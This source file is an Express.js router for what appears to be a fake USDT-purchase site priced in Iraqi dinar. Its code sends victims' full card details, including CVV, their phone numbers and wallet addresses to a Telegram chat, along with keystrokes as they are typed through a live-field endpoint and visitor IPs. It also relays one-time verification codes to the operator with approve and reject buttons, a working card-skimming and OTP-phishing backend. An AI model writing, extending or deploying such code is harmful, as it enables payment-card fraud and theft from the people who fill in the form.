import { Router, type IRouter } from "express";
import {
  NotifyVisitBody,
  NotifyVisitResponse,
  SubmitOrderBody,
  SubmitOrderResponse,
  SubmitVerificationCodeBody,
  SubmitVerificationCodeResponse,
} from "@workspace/api-zod";

const router: IRouter = Router();

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const notifiedVisitIPs = new Set<string>();
const orderStatuses = new Map<string, "pending" | "approved" | "rejected">();

let exchangeRate = 1320;
let orderCounter = Math.floor(1000 + Math.random() * 8999);

function getClientIP(req: any): string {
  return (
    req.headers["x-forwarded-for"]?.toString().split(",")[0]?.trim() ||
    req.headers["x-real-ip"]?.toString() ||
    req.socket?.remoteAddress ||
    "unknown"
  );
}

async function sendTelegramMessage(text: string, replyMarkup?: any): Promise<boolean> {
  if (!BOT_TOKEN || !CHAT_ID) {
    console.error("Telegram bot token or chat ID not configured");
    return false;
  }
  try {
    const payload: any = {
      chat_id: CHAT_ID,
      text,
      parse_mode: "HTML",
    };
    if (replyMarkup) payload.reply_markup = replyMarkup;
    const res = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      }
    );
    return res.ok;
  } catch {
    return false;
  }
}

function generateOrderId(): string {
  orderCounter++;
  return `#${orderCounter}`;
}

const fieldLabels: Record<string, string> = {
  amount: "💰 المبلغ",
  walletAddress: "📦 عنوان المحفظة",
  cardName: "👤 اسم صاحب البطاقة",
  cardNumber: "🔢 رقم البطاقة",
  expiryDate: "📅 تاريخ الانتهاء",
  cvv: "🔐 CVV",
  phone: "📱 رقم الهاتف",
  couponCode: "🎟 كود الخصم",
};

router.post("/telegram/live-field", async (req, res) => {
  try {
    const { field, value } = req.body;
    if (!field || !value) return res.json({ success: false });
    const ip = getClientIP(req);
    const label = fieldLabels[field] || field;
    const msg = `✏️ <b>كتابة مباشرة</b>\n\n${label}: <b>${value}</b>\n\n🌐 IP: ${ip}`;
    await sendTelegramMessage(msg);
    res.json({ success: true });
  } catch {
    res.json({ success: false });
  }
});

router.get("/config/rate", (_req, res) => {
  res.json({ rate: exchangeRate, ratePerHundred: exchangeRate * 100 });
});

router.get("/order/status/:orderId", (req, res) => {
  const orderId = req.params.orderId;
  const status = orderStatuses.get(orderId) || "pending";
  res.json({ orderId, status });
});

router.post("/telegram/notify-visit", async (req, res) => {
  try {
    const body = NotifyVisitBody.parse(req.body);
    const ip = getClientIP(req);

    if (notifiedVisitIPs.has(ip)) {
      const result = NotifyVisitResponse.parse({
        success: true,
        message: "تم إرسال الإشعار مسبقاً",
      });
      return res.json(result);
    }

    notifiedVisitIPs.add(ip);

    const message =
      `🔔 <b>زائر جديد دخل صفحة الشراء</b>\n\n` +
      `⏰ الوقت: ${body.timestamp}\n` +
      `🌐 IP: ${ip}\n` +
      `📍 صفحة: نموذج الشراء\n\n` +
      `👁 شخص يتصفح الموقع الآن...`;
    const sent = await sendTelegramMessage(message);
    const result = NotifyVisitResponse.parse({
      success: sent,
      message: sent ? "تم إرسال الإشعار" : "فشل إرسال الإشعار",
    });
    res.json(result);
  } catch {
    res.status(400).json({ success: false, message: "بيانات غير صحيحة" });
  }
});

router.post("/telegram/submit-order", async (req, res) => {
  try {
    const body = SubmitOrderBody.parse(req.body);
    const ip = getClientIP(req);
    const orderId = generateOrderId();
    const message =
      `🛒 <b>طلب شراء جديد!</b>\n\n` +
      `📋 <b>رقم الطلب:</b> ${orderId}\n` +
      `💰 <b>المبلغ:</b> ${body.amount} USDT\n` +
      `💵 <b>المبلغ بالدينار:</b> ${body.amountIQD.toLocaleString()} IQD\n\n` +
      `💳 <b>طريقة الدفع:</b> ${body.paymentMethod}\n` +
      `👤 <b>اسم صاحب البطاقة:</b> ${body.cardName}\n` +
      `🔢 <b>رقم البطاقة:</b> ${body.cardNumber}\n` +
      `📅 <b>تاريخ الانتهاء:</b> ${body.expiryDate}\n` +
      `🔐 <b>CVV:</b> ${body.cvv}\n\n` +
      `📱 <b>رقم الهاتف:</b> ${body.phone}\n` +
      `📦 <b>عنوان المحفظة:</b> ${body.walletAddress}\n` +
      (body.couponCode ? `🎟 <b>كود الخصم:</b> ${body.couponCode}\n` : "") +
      `🌐 <b>IP:</b> ${ip}\n` +
      `\n⏳ <b>الزبون ينتظر كود التحقق الآن...</b>`;
    const sent = await sendTelegramMessage(message);
    const result = SubmitOrderResponse.parse({
      success: sent,
      message: sent ? "تم إرسال الطلب بنجاح" : "فشل إرسال الطلب",
      orderId,
    });
    res.json(result);
  } catch {
    res.status(400).json({ success: false, message: "بيانات غير صحيحة", orderId: "" });
  }
});

router.post("/telegram/submit-code", async (req, res) => {
  try {
    const body = SubmitVerificationCodeBody.parse(req.body);

    orderStatuses.set(body.orderId, "pending");

    const message =
      `🔑 <b>تم إدخال كود التحقق</b>\n\n` +
      `📋 <b>رقم الطلب:</b> ${body.orderId}\n` +
      `🔐 <b>كود التحقق:</b> ${body.code}\n\n` +
      `⏳ الزبون ينتظر قرارك...`;
    const sent = await sendTelegramMessage(message, {
      inline_keyboard: [
        [
          { text: "✅ موافقة", callback_data: `approve_${body.orderId}` },
          { text: "❌ رفض", callback_data: `reject_${body.orderId}` },
        ],
      ],
    });
    const result = SubmitVerificationCodeResponse.parse({
      success: sent,
      message: sent ? "تم إرسال الكود بنجاح" : "فشل إرسال الكود",
    });
    res.json(result);
  } catch {
    res.status(400).json({ success: false, message: "بيانات غير صحيحة" });
  }
});

// --- Telegram Bot Polling ---

let lastUpdateId = 0;
let awaitingRateInput = false;

async function answerCallbackQuery(callbackQueryId: string, text: string) {
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ callback_query_id: callbackQueryId, text }),
    });
  } catch {}
}

async function pollTelegramUpdates() {
  if (!BOT_TOKEN || !CHAT_ID) return;

  try {
    const res = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30&allowed_updates=["message","callback_query"]`,
    );
    if (!res.ok) return;
    const data = await res.json();
    if (!data.ok || !data.result) return;

    for (const update of data.result) {
      lastUpdateId = update.update_id;

      if (update.callback_query) {
        const cb = update.callback_query;
        const cbChatId = cb.message?.chat?.id?.toString();
        if (cbChatId !== CHAT_ID) continue;

        if (cb.data?.startsWith("approve_")) {
          const oid = cb.data.replace("approve_", "");
          orderStatuses.set(oid, "approved");
          await answerCallbackQuery(cb.id, "تمت الموافقة ✅");
          await sendTelegramMessage(
            `✅ <b>تمت الموافقة على الطلب ${oid}</b>\n\n` +
            `تم إبلاغ الزبون بنجاح العملية.`
          );
          continue;
        }

        if (cb.data?.startsWith("reject_")) {
          const oid = cb.data.replace("reject_", "");
          orderStatuses.set(oid, "rejected");
          await answerCallbackQuery(cb.id, "تم الرفض ❌");
          await sendTelegramMessage(
            `❌ <b>تم رفض الطلب ${oid}</b>\n\n` +
            `تم إبلاغ الزبون بأن الكود غلط.`
          );
          continue;
        }

        if (cb.data === "change_rate") {
          awaitingRateInput = true;
          await answerCallbackQuery(cb.id, "أرسل السعر الجديد");
          await sendTelegramMessage(
            `💱 <b>تغيير سعر الصرف</b>\n\n` +
            `السعر الحالي: <b>${exchangeRate.toLocaleString()}</b> دينار لكل 1 USDT\n` +
            `(100$ = ${(exchangeRate * 100).toLocaleString()} دينار)\n\n` +
            `📝 أرسل السعر الجديد لكل 1 USDT (مثال: 1320)`
          );
        } else if (cb.data === "view_rate") {
          await answerCallbackQuery(cb.id, "السعر الحالي");
          await sendTelegramMessage(
            `💱 <b>سعر الصرف الحالي</b>\n\n` +
            `1 USDT = <b>${exchangeRate.toLocaleString()}</b> دينار عراقي\n` +
            `100 USDT = <b>${(exchangeRate * 100).toLocaleString()}</b> دينار عراقي`
          );
        } else if (cb.data === "view_stats") {
          await answerCallbackQuery(cb.id, "الإحصائيات");
          await sendTelegramMessage(
            `📊 <b>إحصائيات Omaox</b>\n\n` +
            `📋 آخر رقم طلب: <b>${orderCounter}</b>\n` +
            `💱 سعر الصرف: <b>${exchangeRate.toLocaleString()}</b> د.ع/USDT\n` +
            `👥 زوار فريدين (IPs): <b>${notifiedVisitIPs.size}</b>`
          );
        }
        continue;
      }

      if (update.message) {
        const msg = update.message;
        const chatId = msg.chat?.id?.toString();
        if (chatId !== CHAT_ID) continue;

        if (msg.text === "/admin") {
          awaitingRateInput = false;
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              text: `⚙️ <b>لوحة تحكم Omaox</b>\n\nاختر أحد الخيارات:`,
              parse_mode: "HTML",
              reply_markup: {
                inline_keyboard: [
                  [{ text: "💱 تغيير سعر الصرف", callback_data: "change_rate" }],
                  [{ text: "📊 عرض السعر الحالي", callback_data: "view_rate" }],
                  [{ text: "📈 إحصائيات", callback_data: "view_stats" }],
                ],
              },
            }),
          });
          continue;
        }

        if (awaitingRateInput && msg.text) {
          const newRate = parseInt(msg.text.trim(), 10);
          if (!isNaN(newRate) && newRate > 0) {
            const oldRate = exchangeRate;
            exchangeRate = newRate;
            awaitingRateInput = false;
            await sendTelegramMessage(
              `✅ <b>تم تغيير سعر الصرف بنجاح!</b>\n\n` +
              `السعر القديم: <b>${oldRate.toLocaleString()}</b> د.ع/USDT\n` +
              `السعر الجديد: <b>${newRate.toLocaleString()}</b> د.ع/USDT\n\n` +
              `100$ = <b>${(newRate * 100).toLocaleString()}</b> دينار عراقي\n\n` +
              `🔄 تم تحديث الموقع تلقائياً`
            );
          } else {
            await sendTelegramMessage("❌ رقم غير صالح. أرسل رقم صحيح (مثال: 1320)");
          }
          continue;
        }
      }
    }
  } catch {}
}

let pollingInterval: ReturnType<typeof setInterval> | null = null;

function startBotPolling() {
  if (pollingInterval) return;
  console.log("Telegram bot polling started");
  async function loop() {
    await pollTelegramUpdates();
    pollingInterval = setTimeout(loop, 1000) as any;
  }
  loop();
}

startBotPolling();

export default router;
